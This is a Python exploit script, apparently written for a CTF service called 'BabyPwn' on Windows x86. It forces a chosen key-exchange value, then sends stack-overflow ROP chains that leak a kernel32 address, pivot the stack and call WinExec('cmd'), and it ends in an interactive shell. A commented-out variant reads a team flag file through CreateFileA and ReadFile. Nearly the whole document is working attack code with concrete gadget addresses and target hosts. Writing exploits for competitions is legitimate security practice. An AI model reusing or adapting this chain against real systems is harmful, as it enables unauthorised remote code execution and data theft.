#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

context(os = 'windows', arch = 'x86')
context.log_level = 'debug'

#==========

env = Environment('local', 'remote')
env.set_item('mode',    local = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  local   = {'host':'192.168.44.1', 'port':10001}, \
                        remote  = {'host':'172.16.3.230', 'port':10001})
env.select()

'''
policy = Environment('cmd', 'flag')
policy.set_item('target',  cmd  = 'cmd', \
                           flag = 'C:\\Users\\user\\Desktop\\1\\team09_8967317123.txt')
policy.set_item('offset',  cmd  = 0x30, flag = 0x90)
policy.select()
'''

#==========

addr_bin_base       = 0x00e00000
addr_bin_main       = addr_bin_base + 0x12fb0
addr_bin_j_printf   = addr_bin_base + 0x1105a
addr_bin_read       = addr_bin_base + 0x16698

addr_bin_ret        = addr_bin_base + 0x11944
addr_bin_leave      = addr_bin_base + 0x1196b

addr_bin_textbss    = addr_bin_base + 0x01000
addr_bin_stack      = addr_bin_textbss + 0x8000

addr_bin_iat_GetCurrentThreadId         = addr_bin_base + 0x1c054
'''
addr_gmp_read       = 0x10021fd9
addr_gmp_write      = 0x10023bd0

addr_gmp_ret        = 0x1000105b
addr_gmp_pop13      = 0x10010cdf
addr_gmp_leave      = 0x1001eabc

addr_gmp_data       = 0x1002d000
addr_gmp_stack      = addr_gmp_data + 0x4800

addr_gmp_iat_GetCurrentThreadId         = 0x10028088
'''

offset_kernel32_GetCurrentThreadId      = 0x00011a60
offset_kernel32_Sleep                   = 0x00018d80
offset_kernel32_WinExec                 = 0x0005dc40
offset_kernel32_CreateFileA             = 0x00023c00
offset_kernel32_ReadFile                = 0x00023f90

#==========

def attack(conn, **kwargs):
    bp = BabyPwn(conn)

    p = '0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f20fefffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffd9f5267f5c7d9bb614eca0bc2991d7f5f918eefb986422d8e9b8b511d1f52bbdb2678c5f823638cc116c643c4017ba91abf91fba9b11398434d54c467cc2e9b7b585173d8c304291d3830c201812c1d24352c9a26ce96ce87f4f2c565b32267682e2317da7389e9cefa50121884af36fc90a50c906f50ef9e692ad15d40ebfc42e589ad7abfe6b18040cc6f9a7ec8ceb6465fc5e782137f5d0af68be63a329935309213be4121297c8fd130696669c8baa76bccacd355df032aa08c7d981a7b7c8741'
    q = '010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004b'
    g = '2'
    x = '0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f20fefffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffd9f5267f5c7d9bb614eca0bc2991d7f5f918eefb986422d8e9b8b511d1f52bbdb2678c5f823638cc116c643c4017ba91abf91fba9b11398434d54c467cc2e9b7b585173d8c304291d3830c201812c1d24352c9a26ce96ce87f4f2c565b32267682e2317da7389e9cefa50121884af36fc90a50c906f50ef9e692ad15d40ebfc42e589ad7abfe6b18040cc6f9a7ec8ceb6465fc5e782137f5d0af68be63a329935309213be4121297c8fd130696669c8baa76bccacd355df032aa08c7d981a7b7c8740'

    while bp.key(p, q, g, x) != x:
        pass

    exploit  = 'a'*0x10
    exploit += p32(addr_bin_j_printf)
    exploit += p32(addr_bin_main)
    exploit += p32(addr_bin_iat_GetCurrentThreadId)
    bp.submit(exploit)

    conn.recvuntil('Done!')
    addr_kernel32_GetCurrentThreadId        = u32(conn.recv(4))
    addr_kernel32_base                      = addr_kernel32_GetCurrentThreadId - offset_kernel32_GetCurrentThreadId
    addr_kernel32_Sleep                     = addr_kernel32_base + offset_kernel32_Sleep
    addr_kernel32_WinExec                   = addr_kernel32_base + offset_kernel32_WinExec
    addr_kernel32_CreateFileA               = addr_kernel32_base + offset_kernel32_CreateFileA
    addr_kernel32_ReadFile                  = addr_kernel32_base + offset_kernel32_ReadFile
    info('addr_kernel32_base    = 0x{:08x}'.format(addr_kernel32_base))

    while bp.key(p, q, g, x) != x:
        pass

    exploit  = 'b'*0xc
    exploit += p32(addr_bin_stack - 4)
    exploit += p32(addr_bin_read)
    exploit += p32(addr_bin_leave)
    exploit += p32(0)
    exploit += p32(addr_bin_stack)
    exploit += p32(0x800)
    bp.submit(exploit)

    conn.recvuntil('Done!')

    exploit  = p32(addr_kernel32_WinExec)
    exploit += p32(addr_bin_ret)
    exploit += p32(addr_bin_stack + 0x30)
    exploit += p32(0x1)
    exploit += p32(addr_kernel32_Sleep)
    exploit += p32(0xcafebabe)
    exploit += p32(60*60*1000)

    conn.send(exploit.ljust(0x30, '\x00') + 'cmd')

    '''
    exploit  = 'a'*0x10
    exploit += p32(addr_gmp_write)
    exploit += p32(addr_gmp_pop13)
    exploit += p32(1)
    exploit += p32(addr_gmp_iat_GetCurrentThreadId)
    exploit += p32(4)
    bp.submit(exploit)

    while bp.key(p, q, g, x) != x:
        pass

    exploit  = 'b'*0xc
    exploit += p32(addr_gmp_stack - 4)
    exploit += p32(addr_gmp_read)
    exploit += p32(addr_gmp_leave)
    exploit += p32(0)
    exploit += p32(addr_gmp_stack)
    exploit += p32(0x800)
    bp.submit(exploit)

    conn.recvuntil('Done!')

    addr_gmp_buf        = addr_gmp_stack + policy.offset
    if policy.check('cmd'):
        exploit  = p32(addr_kernel32_WinExec)
        exploit += p32(addr_gmp_ret)
        exploit += p32(addr_gmp_buf)
        exploit += p32(0x1)
        exploit += p32(addr_kernel32_Sleep)
        exploit += p32(0xcafebabe)
        exploit += p32(60*60*1000)
    else:
        exploit  = p32(addr_kernel32_CreateFileA)
        exploit += p32(addr_gmp_ret)
        exploit += p32(addr_gmp_buf)
        exploit += p32(0x80000000)
        exploit += p32(0x1)
        exploit += p32(0)
        exploit += p32(0x3)
        exploit += p32(0)
        exploit += p32(0)

        for fh in [0x124, 0x128, 0x12c]:
            exploit += p32(addr_kernel32_ReadFile)
            exploit += p32(addr_gmp_ret)
            exploit += p32(fh)
            exploit += p32(addr_gmp_buf + 0x100)
            exploit += p32(0x400)
            exploit += p32(addr_gmp_buf + 0x400)
            exploit += p32(0)

        exploit += p32(addr_gmp_write)
        exploit += p32(0xdeadbeef)
        exploit += p32(1)
        exploit += p32(addr_gmp_buf + 0x100)
        exploit += p32(0x400)

    conn.send(exploit.ljust(policy.offset, '\x00') + policy.target)
    '''

class BabyPwn:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def key(self, p, q, g, x):
        self.sendlineafter('> ', '1')
        self.sendlineafter('p (', p)
        self.sendlineafter('q (', q)
        self.sendlineafter('g (', g)
        self.sendlineafter('g^a (', x)
        self.recvuntil('Key : ')
        return self.recvuntil('\r\n', drop=True)

    def submit(self, ID):
        self.sendlineafter('> ', '4')
        self.sendlineafter('ID: ', ID)

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    
#==========
